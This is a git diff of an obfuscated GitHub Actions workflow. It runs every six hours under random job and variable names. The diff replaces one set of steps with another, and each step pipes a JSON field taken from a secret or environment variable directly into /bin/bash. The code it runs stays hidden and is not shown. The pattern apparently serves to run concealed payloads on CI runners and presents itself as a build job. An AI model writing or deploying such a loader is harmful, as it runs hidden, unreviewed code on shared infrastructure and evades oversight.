@@ -1,33 +1,28 @@
 name: leihuoba7834
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
-
-jobs:  # 6264
+    - cron: '21 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: leihuoba7834
         env:
-          gnhiy2: ${{ secrets.gnhiy2 }}
+          d692: ${{ secrets.d692 }}
         run: |
-          echo $gnhiy2 | jq -r .az1 | /bin/bash
-          echo $d0 | jq -r .izk60973 | /bin/bash
-          echo $zakys276 | jq -r .izb2 | /bin/bash
-          echo $zsdxx78 | jq -r .st28038 | /bin/bash
-          echo $gzft70 | jq -r .xlqla45915 | /bin/bash
-          echo $xhgt7178 | jq -r .ilczb09 | /bin/bash
-          echo $glhy3 | jq -r .l661 | /bin/bash
-          echo $mgjxv8321 | jq -r .w5 | /bin/bash
-          echo $cx984 | jq -r .kpzw6836 | /bin/bash
-          echo $ue88 | jq -r .k6 | /bin/bash
-          echo $vqfb9068 | jq -r .ik3733 | /bin/bash
-          echo $rdg6652 | jq -r .elp550 | /bin/bash
-          echo $c97691 | jq -r .exud268 | /bin/bash
-          echo $vh5301 | jq -r .rdodi94 | /bin/bash
-          echo $lr4 | jq -r .azh37 | /bin/bash
-          echo $ygqv1 | jq -r .dfv1 | /bin/bash
+          echo $d692 | jq -r .oyhxc4102 | /bin/bash
+          echo $g44 | jq -r .uky67 | /bin/bash
+          echo $rru43810 | jq -r .fi9 | /bin/bash
+          echo $euzl4 | jq -r .izc25 | /bin/bash
+          echo $zalk4 | jq -r .ltqlv68 | /bin/bash
+          echo $odnn5 | jq -r .oe1411 | /bin/bash
+          echo $ltu465 | jq -r .l32 | /bin/bash
+          echo $e960 | jq -r .zcru17375 | /bin/bash
+          echo $qup57 | jq -r .ly58211 | /bin/bash
+          echo $rmu459 | jq -r .e620 | /bin/bash
+          echo $ywpng03744 | jq -r .ahxo999 | /bin/bash
+          echo $ui2 | jq -r .ipsp1 | /bin/bash
 
